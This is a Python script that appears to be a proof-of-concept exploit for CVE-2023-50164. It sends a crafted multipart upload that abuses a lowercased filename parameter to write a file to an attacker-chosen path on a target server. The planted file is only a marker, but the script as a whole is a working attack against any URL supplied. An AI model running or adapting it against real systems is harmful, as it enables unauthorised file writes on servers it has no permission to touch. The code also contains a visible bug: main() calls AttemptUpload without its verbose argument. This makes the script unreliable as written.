import argparse
import random
import string
import requests
import datetime

from requests_toolbelt import MultipartEncoder

def create_multipart_body(uploadVar, fileNameVar, payloadPath):
    """
    Creates a multipart body with a random boundary and a benign file upload.
    
    This is the meat of the exploit, first it checks if the fileNameVar starts with an uppercase letter and, if so, lowercases the string because the filenamevar needs to be lowercase for this to work.
    
    Then it attempts to upload a benign file (benign.txt) and subsequently overwrite it with the benign payload at the chosen payload path.
    """
    boundary = '----WebKitFormBoundary' + ''.join(random.sample(string.ascii_letters + string.digits, 16))
    fileContent = "SUCCESSFULLY EXPLOITED CVE-2023-50164 AT " + str(datetime.datetime.now())
    multipart_data = MultipartEncoder(
        fields={
            uploadVar: ('benign.txt', fileContent, 'text/plain'),
            fileNameVar.lower(): payloadPath
        },
        boundary=boundary
    )

    return multipart_data


def AttemptUpload(url, uploadVar, fileNameVar, payloadPath, follow302, verbose):
    """
    Attempts to upload the payload to the server.
    """
    body = create_multipart_body(uploadVar, fileNameVar, payloadPath)
    if verbose:
        print(f"[+] Generated multipart body:\n {body.to_string()}\n")
    headers = {"Content-Type": body.content_type}
    if verbose:
        print(f"[+] Attempting to upload payload to {url}")
    response = requests.post(url, data=body, headers=headers, allow_redirects=follow302)
    return response   

def main(url, uploadVar, fileNameVar, payloadPath, follow302, verbose):
    """
    Main function that checks for required arguments and calls the exploit function.
    """
    if url is None:
        print("--url is required")
        return
    
    if uploadVar is None:
        print("--uploadvar variable name is required")
        return
    
    if fileNameVar is None:
        print("--filenamevar variable name is required")
        return
    
    if payloadPath is None:
        print("--payloadpath is required")
        return
    
    if follow302 is None:
        follow302 = False
        
    if verbose is None:
        verbose = False
        
    if verbose:
        print(f"[+] initiated CVE-2023-50164 exploit test against {url}")
        
    response = AttemptUpload(url, uploadVar, fileNameVar, payloadPath, follow302)
    
    if response.status_code == 200:
        print(f"Upload action returned a 200. Check the server to see if the payload was uploaded to: {payloadPath}")
    else:
        print(f"Upload action returned a {response.status_code}. Check the server to see if the payload was uploaded to: {payloadPath}")
        if verbose:
            print(f"Response Text:\n{response.text}")
    
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Process command line flags.")

    parser.add_argument("--url", type=str, required=True, help="URL to process")
    parser.add_argument("--uploadvar", type=str, required=True, help="Upload variable name")
    parser.add_argument("--filenamevar", type=str, required=True, help="uploadFileName variable name")
    parser.add_argument("--payloadpath", type=str, required=True, help="Path where the payload should be written to (include file name and extension)")
    parser.add_argument("--follow302", action='store_true', help="Follow HTTP 302 redirects")
    parser.add_argument("--verbose", action='store_true', help="Print verbose output")

    args = parser.parse_args()

    main(args.url, args.uploadvar, args.filenamevar, args.payloadpath, args.follow302, args.verbose)
